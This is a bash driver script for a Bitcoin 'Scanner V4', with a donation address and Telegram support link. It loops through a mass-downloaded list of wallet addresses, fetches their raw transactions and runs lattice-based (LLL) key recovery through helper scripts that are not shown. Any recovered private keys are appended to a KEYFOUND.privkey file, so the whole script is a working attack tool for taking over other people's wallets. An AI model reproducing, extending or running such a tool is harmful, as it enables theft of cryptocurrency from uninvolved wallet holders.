#!/bin/bash
echo "  ______ ____   _____ _    _  _____ ";
echo " |  ____/ __ \ / ____| |  | |/ ____|";
echo " | |__ | |  | | |    | |  | | (___  ";
echo " |  __|| |  | | |    | |  | |\___ \ ";
echo " | |   | |__| | |____| |__| |____) |";
echo " |_|    \____/ \_____|\____/|_____/ ";
echo "                                    ";
echo "                                    ";
echo Scanner V4 Started
echo Donations : bc1q962duatv26hzw080uxu65damn06l5pgsdnx6lt
echo This program receives the raw transaction information of a wallet address and checks the weak points.
echo  Access to the private key by calculating the matrix. So if there is a weakness in the address transaction,
echo  you will have access to the wallet. And if there is no weakness, it will delete that address from the list and check the next address
echo There are more than 32000000 bitcoin addresses that you can download from this link
echo https://gz.blockchair.com/bitcoin/addresses/blockchair_bitcoin_addresses_latest.tsv.gz
echo The program needs to be restarted every 1000 rounds
echo Support : https://t.me/Mohsenkeshavarzian
echo goodluck
#========================================================
for run in {1..1000}; do

    rm addrone.mnk &> /dev/null
    rm result.sql &> /dev/null
    rm *.data &> /dev/null
    rm *.db &> /dev/null
    rm rawdata.data &> /dev/null
    rm rawdata2.data &> /dev/null
    rm rawdata3.data &> /dev/null
#====================================================    
  rm chain3file.py
  cp mohsen.py chain3file.py
  echo Receiving raw address information .....
#================================================    
    export LINE=1 ; sed -n "${LINE}p" addr.mnk > addrone.mnk
#=====================================================    
    python3 chainaddr.py
    chmod +x get-raw.sh
    sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
     
     python3 chainaddr2.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
     
     python3 chainaddr3.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
     
     python3 chainaddr4.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
       
     python3 chainaddr5.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
     
     python3 chainaddr6.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
     
     python3 chainaddr7.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
          
     python3 chainaddr8.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
     
     python3 chainaddr9.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
     
      python3 chainaddr10.py
     chmod +x get-raw.sh
     sed -i -e 's/\r$//' get-raw.sh
     ./get-raw.sh
         


#================================================
    python3 find.py
    grep mohsen  Eslah.txt > Eslah2.txt
    python3 find2.py
    grep -o -P '(?<=focus).*(?=focus)'  Eslah3.txt > index2grep.data
    rm Eslah.txt &> /dev/null 
    rm Eslah2.txt &> /dev/null
    rm Eslah3.txt &> /dev/null
#====================================================
    python3 chain2file.py
    chmod +x chainScript.sh
    sed -i -e 's/\r$//' chainScript.sh
    ./chainScript.sh
 #==================================================================   
    python3 chain3file.py
    sed -i 's/result.sql/result.sql\nrm *.txt\nrm *.csv\nrm *.json/g' startScript.sh
    chmod +x lattice.sh
    sed -i -e 's/\r$//' lattice.sh
    chmod +x startScript.sh
    sed -i -e 's/\r$//' startScript.sh
     echo Information received
     echo Start algorithmLLL   
    ./startScript.sh

    grep ":" result.sql >> KEYFOUND.privkey
    sed -i '1d' addr.mnk
#=====================================================================    

    rm addrone.mnk &> /dev/null
    rm result.sql &> /dev/null
    rm *.data &> /dev/null
    rm *.db &> /dev/null
    rm rawdata.data &> /dev/null
    rm rawdata2.data &> /dev/null
    rm rawdata3.data &> /dev/null

    echo ============END number $run - Start NEXT ADDRESS  ===========
done